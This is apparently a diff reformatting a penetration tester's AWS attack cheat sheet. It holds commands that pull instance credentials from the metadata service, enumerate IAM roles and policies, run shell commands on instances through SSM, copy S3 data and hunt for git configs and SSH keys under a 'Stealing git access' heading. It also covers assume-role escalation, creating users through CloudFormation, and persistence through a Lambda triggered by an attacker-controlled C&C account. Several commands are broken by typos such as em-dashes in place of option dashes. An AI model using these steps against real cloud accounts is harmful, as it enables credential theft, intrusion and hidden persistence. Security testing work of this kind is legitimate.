@@ -76,10 +76,7 @@ aws iam get-role-policy --role-name <value>
 ```
 aws iam get-instance-profile —instance-profile-name <instance_profile_name>     (gets roles and policies that this instance profile has)
 
----
-Escalation (using assume role)
-
-
+## Escalation (using assume role)
 Pulling interesting metadata
 curl  http://169.254.169.254/latest/meta-data/
 curl  http://169.254.169.254/latest/user-data
@@ -88,16 +85,17 @@ curl  http://169.254.169.254/latest/meta-data/iam/info/
 curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/<instance_profile_name>
 
 Running aws-configure
+```
 mkdir ~/.aws
 cat <<EOF >~.awsconfig
 [default]
 output = json
 region = us-east-1
 EOF
+```
 
-
-
-Aws CLI fun
+## Aws CLI fun
+```
 aws iam get-instance-profile —instance-profile-name <instance_profile_name>
 aws iam get-role —role-name jslave
 aws iam list-account-aliases
@@ -106,21 +104,24 @@ aws iam list-roles
 aws iam list-attached-role-policies —role-name <role_name>
 aws iam list-role-policies —-role-name <role_name>
 aws iam get-role-policy —-role-name <role_name> —policy-name <policy_name>
-
+```
 
 Aws CLI get current user (one of these may work)
+```
 aws iam get-user
 aws sts get-caller-identity
-
+```
 AWS SSM Run commands
+```
 aws ssm send-command --instance-ids "i-0ddd4588e3ab7bd99" --document-name "AWS-RunShellScript" --comment "IP config" --parameters commands=ifconfig --output text
-
+```
 
 Getting account info
-
 Get-caller-identity gives the account number. List-account-aliases gives alias.
+```
 aws sts get-caller-identity
 aws iam list-account-aliases
+```
 
 Sign in URL
 https://Your_AWS_Account_ID.signin.aws.amazon.com/console/
@@ -129,29 +130,34 @@ https://Your_Alias.signin.aws.amazon.com/console/
 
 AWS S3 CLI
 
+```
 aws s3 ls
 aws s3 ls s3://bucket/dir/
 aws s3 cp s3://bucket/dir/file .
+```
 
 AWS codecommit
+```
 aws codecommit list-repositories —region us-east-1
-
+```
 Things to work on
-$ aws sts get-session-token
-—
+```
+aws sts get-session-token
+```
 
 Testing git access
 
+```
 cat ~/.gitconfig
 find / | grep ‘.git/config’        (finding any local git repos)
 cat ….git/config               (finding where the git repos are hosted)
-git config —list
-
-* there does not seem to be a way to get a list of all repos. bitbucket has an api that will list them if you have a username/password (and not just an ssh key)
+git config --list
+```
+- there does not seem to be a way to get a list of all repos. bitbucket has an api that will list them if you have a username/password (and not just an ssh key)
 
 Stealing git access
 
-* copy ~gitconfig and all the files in ~.ssh
+- copy ~gitconfig and all the files in ~.ssh
 
 SSRF notes
 
@@ -185,6 +191,15 @@ aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/example-role" --r
 aws cloudformation create-stack --stack-name myuser --template-body file://user.yaml --capabilities CAPABILITY_NAMED_IAM
 ```
 
+## Persistence
+### Lambda
+* On compromise (instance or lambda)
+* Create lambda
+	* Using existing role
+	* Set to trigger on SNS messages from C&C in another account.
+[AWS SNS to Lambda Cross Account Setup - Shogan.tech](https://www.shogan.co.uk/aws/aws-sns-to-lambda-cross-account-setup/)
+
 # References
 * [AWS - Pentest Book](https://pentestbook.six2dez.com/enumeration/cloud/aws)
 * [GitHub - RhinoSecurityLabs/pacu: The AWS exploitation framework, designed for testing the security of Amazon Web Services environments.](https://github.com/RhinoSecurityLabs/pacu)
+- https://github.com/DataDog/stratus-red-team - aws attack tool
